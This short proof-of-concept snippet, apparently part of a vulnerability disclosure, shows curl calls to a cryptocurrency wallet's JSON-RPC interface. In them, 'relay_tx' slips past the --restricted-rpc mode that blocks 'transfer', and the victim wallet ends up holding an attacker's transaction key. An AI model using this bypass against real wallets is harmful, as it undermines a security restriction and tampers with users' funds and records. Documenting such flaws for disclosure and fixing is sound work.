# wallet_b (--restricted-rpc): transfer is blocked, relay_tx is not
curl -s http://127.0.0.1:18091/json_rpc -d '{"jsonrpc":"2.0","id":"0","method":"transfer",...}'
# → {"error":{"code":-7,"message":"Command unavailable in restricted mode."}}

curl -s http://127.0.0.1:18091/json_rpc \
  -d "{\"jsonrpc\":\"2.0\",\"id\":\"0\",\"method\":\"relay_tx\",\"params\":{\"hex\":\"$TX_META\"}}"
# → {"result":{"tx_hash":"..."}}   ← succeeds despite restricted mode

# After storing wallet_b state and restarting unrestricted:
curl -s http://127.0.0.1:18091/json_rpc \
  -d "{\"jsonrpc\":\"2.0\",\"id\":\"0\",\"method\":\"get_tx_key\",\"params\":{\"txid\":\"<TXID>\"}}"
# → {"result":{"tx_key":"<ATTACKER_KEY>"}}   ← victim now holds attacker's key
